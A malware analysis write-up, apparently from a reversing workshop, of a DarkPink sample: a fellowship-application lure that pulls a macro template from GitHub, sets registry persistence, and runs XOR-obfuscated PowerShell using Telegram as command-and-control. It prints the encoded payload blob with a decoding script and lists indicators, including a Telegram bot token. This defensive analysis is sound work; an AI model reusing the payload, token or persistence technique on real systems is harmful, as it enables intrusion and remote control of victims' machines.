---
title: "DarkPink"
date: 2025-1-28
categories: [Malware Analysis,Malware-Analysis-and-Reversing-Workshop]
tags: [Malware Analysis,Malware-Analysis-and-Reversing-Workshop]
image: assets/logo/MAARE.png
---

## Executive Summary

The malware analyzed script employs a PowerShell-based obfuscation technique using Base64 encoding and XOR manipulation to conceal its payload. The malware communicates with a command and control(C2) server via Telegram’s API and leverages various system registry keys to establish persistence and facilitate data retrieval. It was initial download from the Macro template that  injection using a malicious URL hosted on `GitHub` inside the document file. Key functionalities include fetching the victim's public IP address, sending data to the `Telegram` C2 server, and utilizing obfuscated commands to execute its operations.

---

## Case Details

### **Sample Information**

| **Attribute**         | **Value**                                                                                         |
|-----------------------|-------------------------------------------------------------------------------------------------|
| **File Name**         | `Application-Form-YSEALI-Academic-Fellowship.iso`                         |
| **File Size**         | 314 KB                                                                                        |
| **File Type**         | Disc Image File                                            |
| **MD5**               | `f02a96b84231da7626399ff1ca6fb33f`                                                             |
| **SHA1**              | `4495ec539782cf51fc0187a06bb56f4a1900c6b3`                                                     |
| **SHA256**            | `32955129b966798e66c20ccf2ec4001d32038d296acef3d3001d21eecad712e1`                             |
|-----------------------|-------------------------------------------------------------------------------------------------|
| **File Name**         | `Font.dotm`                         |
| **File Size**         | 25 KB                                                                                        |
| **File Type**         | Microsoft Office Word Macro-Enabled Template (DOTM)                                            |
| **MD5**               | `8691b36952f9b5842a9a26d391f70d88`                                                             |
| **SHA1**              | `6a8cd60ab431e3d0b44c8db61fcc53cae9472ae5`                                                     |
| **SHA256**            | `dc6c94a56e09cbec08c2758b8a9cb4d4762d8f37685815bacc78805ae8e27d48`                             |
|-----------------------|-------------------------------------------------------------------------------------------------|
| **File Name**         | `Application-Form-YSEALI-Academic-Fellowship.docx`                         |
| **File Size**         | 253 KB                                                                                        |
| **File Type**         | Microsoft Office Word Document (DOCX)                                            |
| **MD5**               | `a33af82eba873349abb1cde3bbd2d7f6`                                                             |
| **SHA1**              | `d9e029215dcfe837018a799d4849d64aea68106b`                                                     |
| **SHA256**            | `3fc12c7640b029c9843992622f8485077fe07ae6f0c2950af0b366ea0a330a3e`                             |

---

## Case-Specific Requirements

### **Environment**
- **Operating System:** Windows

### **Tools Used**
- **OLEDUMP**
- **OLEVBA**  
- **PSUnveil**  
- **ProcMon**
- **CMDWatcher**
- **FakeNet**

---

## Static Analysis

Open the .docx as archive and go into `word\_rels\settings.xml.rels`. 

![img1](assets/4-DarkPink/image43.png)

Document of `settings.xml.rels` may be designed to load or use an external template from an online source which is the URL points to a file on GitHub. It could be indicative of the document attempting to fetch and execute content from that URL.

![img2](assets/4-DarkPink/image44.png)

Various sections and objects embedded in the VBA project within the document. The project includes components such as user forms (UserForm1, UserForm2), macros (VBA/NewMacros), and project-related objects (VBA/_VBA_PROJECT, VBA/__SRP_*). It highlights embedded elements like frames, components, and potentially malicious or hidden scripts, with specific offsets denoted (e.g., A1: 600 'PROJECT', A3: 97 'UserForm1/\x01CompObj'). These entries indicate a complex structure of embedded VBA code that may include forms, objects, and other executable elements

![img3](assets/4-DarkPink/image45.png)

While using `OLEVBA` , The macro code write values into the Windows registry. The macro interacts with UserForm1 and UserForm2 elements, writing registry keys based on their captions or values.

Document_Close() Subroutine and Actions Performed
- This runs when the document is closed, creating a Windows Script Host object to write several registry keys using data from user forms. It writes multiple registry keys with data from UserForm1 and UserForm2, potentially setting up persistence or modifying system configurations.

![img4](assets/4-DarkPink/image46.png)

Shell Command for Execution
-	A PowerShell command is executed via cmd.exe, potentially to invoke malicious scripts or further interact with the system’s registry and configuration.

![img5](assets/4-DarkPink/image47.png)

Registry Key Information
-	The script manipulates registry keys, such as those linked to file extensions, possibly to ensure execution persistence or facilitate further payload delivery.

![img6](assets/4-DarkPink/image48.png)

Decode Flow
-	Due to powershell present. Decrypting the Textbox2 must be performed to see how it operates the Decrypting the TextBox1

![img7](assets/4-DarkPink/image49.png)

![img8](assets/4-DarkPink/image50.png)

- This decoded PowerShell command above retrieves a Base64-encoded registry value which was set from VBA and decodes it, and applies a bitwise XOR operation with an incrementing counter to each byte. The result is then converted back to a UTF-8 string, often used for obfuscation. Now proceed with decoding the base64 (provided the decoded using powershell below)

```powershell
$base64String = "KCkgeDcxe3w7O3dwPjtzdClsaSNpbi5qYysvZmcsKGJbExVeXxQeWlMYGVZXHhZSSwIDTk8ED0pDCwtGRwxDRHJyPzh3djs8eX43MHswNX5gLClgKS5iZyUiaGshJm1qHRpQWhkeVFUVElteERZfXg0KQUQJDkIKA0hIBgdOSAL7s//4t7X7/L708bm08PW67eqgp+nupa7l4quv4b++ssaBhcCc4M3dy8fj283V5pvW/teGhYeRm5/blfrQ9ubnsqulkfCE/p6MuP/6hriAruG+gLbz+fGkjJy39ZWS8LyvjJKxoZa1joeHxIijoL6dlYKhmru7u5i8nKfBxpmbnE9MUlFBdlUuKC4mLDo+dHlzZid2bFMkTUlfSiJ6a1pzBw0FEwtNXhBjQwFzBxxMWkAABEVxWX4AWlAOUQkWDE5nbWUNJyoCLgYuF3F2DD0sOTh7Ln17JHB0fj4+e3F5FykMMS4SIioeASY+Gy0qHzs1JEYfQgUaLl9VXQxLKSwPw/e3se3t0ajA797oxtjv5ufk8/nXvtTYr8ri7/jV/cjUitPtlcfSyfKOhoyDmtTB3PDk4NvYwNrCgO/42tOGhvO3oaDyn6PyhoKjgLSnpYWJnYugrO2ZnrODtunujbuop6iB2pDXkcDEzomotr+Gp8XewqCfvqDDzLDKv824rLdKTEdrSH0zVWY7LScrWzZFXGFFYSw+ZEBcUUlWS3ZEOAwGblJdEUQWHw4GDG5EQGlXA0hUenFXVUkLEVpdD0hNB24lJh0QBxcNIgMbHDhhfWcbdX9zEQ1mawRxAx4aJgciJktESEJNLwwFPTsaNwcrNwE2KQAlBUI7KQ40GihJCebH+9Le963w+v3GvM/F6ejCot3joeaxu7/xvbe72sna4YaOhJbBgYuP8MvHg5z6/cjc+9T9/ePa4sny2sjF0eXru4ugt7aFjKe6m5mkvq+In+T1//Oysq2xrajju++W7rCxp5q9jKCenJmTkdnKwsjCu7jKs7qvmrLK0dzQ2rDPWkw1dHFBZ2ZEPG5qeU9kRSBcRmNZVCFifioqaFFXUXxGQ0UVVWJpaklPYk9uCgIIXUJ3eU19f21QX1xeZQp2exEGdhk8MHEvCXELLRQZDXslYh03OBMDETE8NCMNaC48ECINVD4gTRA6Al8IGz5eJjkWFDIdPg4tOgsoQjApLVTFz+/s9L3Dwuq54tro6KXqwMHa/tbm49K/tb3+3dnq8MXPxouN7+POiI+Kg4ze2JrD+fff2NzS7ImelpyO7d39sY6YiePp4ZWRmp6ZiayjkvCKoaqnoZOa9pq1laq4jIu929illqqLhYm6r93YvrqduZ+126y3sY+urYivxY6JulAqTXtUKmFQWmVBSUlmaF9RS1Ahd3RxVmJDUSl4V2tOV1habWgXS29HQn5jZ05oblYWHhRXUQ9AaEEIdlp3UXAEKDtoMBE8bGMrEHw5FSZofHYAe3QmIGIHdQEPGQUKcSVGTkQ3PQ8OIg0HLQAIOiUjP0obISMZLy4UGUwlEwoT2OPz++u17fT+39z72cbJ5OCny/rO3//QzPHZ6vSr0+iVyfPi3JDgkcngyNjp58/58sv02fnn8dPu14/e6MeRjJSOkpuHroS3mIKInPyOv42/tuOa8/nxnZ2w+p2Tj5ueg4mZw4qAscqHq6COr7nOvImChra527+41qquiZmcs61lYCUvI2tMcVlhQ0d0YTpKd2hgRERTX3xUXFh4f3dkbxFycQQIAgYHQWYESGNgXl1VYmF6e1sYU31/dlpoeG1LMgQjDmweFT4bPQ8GYgQhYR0UPxxzeXEiHjUiGAgTFy8yLSQXCwIjAVpeHw9VBgMZQl4CRQI7OAJNLF1XW1VeEeXWr+zGz+PE3K6mrNvo5cTJ89P6xv75oK392MvLxfX40ODk0OvG89Tl+sHszcXY58TV1sDc8/HH8Z6WnMqF/+eChuLq6OWdtJHu5uz++4Wep7WCmKDgpKGilI6S6uqktKiumtadvd/MrJPYjriGrb6JnZ6Ru5OFw5OcrYqmi4mneDQycjNoZD5GTWlqQls9XXZcXUpNMjowIG1KdkV0K3dmVnF6AwkBegNaXB5/ZUtjfFgVHxN4ZXpVWkJZRVYRUgEMEXYcNxx0b2BjZT4IPgMxEhd7fA41HzkrB2ptaHUEAykDETlUV19DMgkjDR8zWkNYXignAQQeNj4nIB81Hw3dsrSqqvfD98Toyc6kqtbN17a+yMfh5P7W3sfA/9X/7f2Sm4qK1+PX5Mjp7oSK5OrZlp7o58HE3vb+5+Df9d/NnfDw9+3luuHo4ervn6Wrg5yYlojliP3zq7Gfl5CUuoTR0r/Iw73Bzg=="

$decodedBytes = [System.Convert]::FromBase64String($base64String)

$i = 0
$obfuscatedBytes = $decodedBytes | ForEach-Object {
    $_ -bxor ($i % 256)
    $i++
}

$decodedString = [System.Text.Encoding]::UTF8.GetString($obfuscatedBytes)

$decodedString
```

First decode:

![img9](assets/4-DarkPink/image51.png)

Decode again using Semi-Auto:

![img10](assets/4-DarkPink/image52.png)

Last Decode:

![img11](assets/4-DarkPink/image53.png)

Now the code can be seen.

Powershell Element

-	TLS Protocols: Sets security protocols (Tls12, Tls11, Tls, Ssl3).
![img12](assets/4-DarkPink/image54.png)
-	Token and ID: Telegram bot token and chat ID for messaging.
![img13](assets/4-DarkPink/image55.png)
-	Registry Access: Retrieves Update and guid from registry.
![img14](assets/4-DarkPink/image56.png)
-	IP Retrieval: Fetches public IP from `hxxps[://]ifconfig[.]me/ip`
![img15](assets/4-DarkPink/image57.png)
-	Mutex Locking: Ensures single instance using guid.
![img16](assets/4-DarkPink/image58.png)
-	Telegram Messaging: Sends reconnection or new connection messages with system details.
![img17](assets/4-DarkPink/image59.png)
-	Update Loop: Continuously checks Telegram messages and executes commands.
![img18](assets/4-DarkPink/image60.png)
-	Message Updates: Sends command output in chunks to Telegram and updates the registry.
![img19](assets/4-DarkPink/image61.png)

Flow:

1. **Set protocols and define Telegram bot variables.**
2. **Check GUID and mid:**  
   - If set, send a connection message.  
   - If not, generate a new GUID and notify.
3. **Continuous loop:**  
   - Check Telegram for commands, execute them, and send the result.
4. **Update registry** with the latest message ID.


---

## Dynamic Analysis

1. **ProcMon created Data of abcd** at `HKCU:\SOFTWARE\Classes\abcdfile\shell` and also Data of (Default) at `HKCU:\SOFTWARE\Classes\abcdfile\shell\open\command`.
   ![img20](assets/4-DarkPink/image62.png)

2. **Entering the Regedit (Registry Editor)** and see the value on the Data of abcd:
   ![img21](assets/4-DarkPink/image63.png)

3. **Entering the Regedit (Registry Editor)** and see the value on the Data of (Default):
   ![img22](assets/4-DarkPink/image64.png)

4. **Another Registry was created** with the Data of UserInitMprLogonScript:
   ![img23](assets/4-DarkPink/image65.png)

5. **The hidden command** on Data was found in:
   `Computer\HKEY_CURRENT_USER\Environment`:
   ![img24](assets/4-DarkPink/image66.png)

6. **Running the command** that hides inside the:
   `Computer\HKEY_CURRENT_USER\Environment\UserInitMprLogonScript`
   ![img25](assets/4-DarkPink/image67.png)

7. **Checking on Fakenet**, a request from domain `ifconfig[.]me` and `api[.]telegram[.]org` exist after executing the command.
   ![img26](assets/4-DarkPink/image68.png)


---

## Indicators of Compromise (IOCs)

| IOC                                              | Type          |
|--------------------------------------------------|---------------|
| hxxps[://]github[.]com/efimovah/abcd/raw/main/Font[.]dotm | URL           |
| hxxps[://]ifconfig[.]me/ip                       | URL           |
| HKCU:\SOFTWARE\Classes\abcdfile\shell            | Registry      |
| HKCU:\Environment\Update                         | Registry      |
| HKCU:\Environment\guid                           | Registry      |
| hxxps[://]api[.]telegram[.]org/bot<token>/sendMessage | URL           |
| hxxps[://]api[.]telegram[.]org/bot<token>/getUpdates | URL           |
| 1823724456                                       | Chat ID Telegram |
| 1962959013:AAFeYlhtlpxOSBNvcewdH_QEJXV8YCqLYgs   | Telegram Token |



---

## Additional Notes

- **Full URL of the remote template injection in this document:**
  - hxxps[://]github[.]com/efimovah/abcd/raw/main/Font[.]dotm

- **Obfuscation method applied to the Base64-decoded data in the PowerShell command:**
  - XOR

- **Registry key that retrieves the obfuscated data:**
  - HKCU:\SOFTWARE\Classes\abcdfile\shell

- **URL used to fetch the public IP address of the infected victim:**
  - hxxps[://]ifconfig[.]me/ip

- **Chat ID used for Telegram communication:**
  - 1823724456

- **API method used to send data to the Telegram API:**
  - sendMessage

- **C2 domain in this malware:**
  - api[.]telegram[.]org

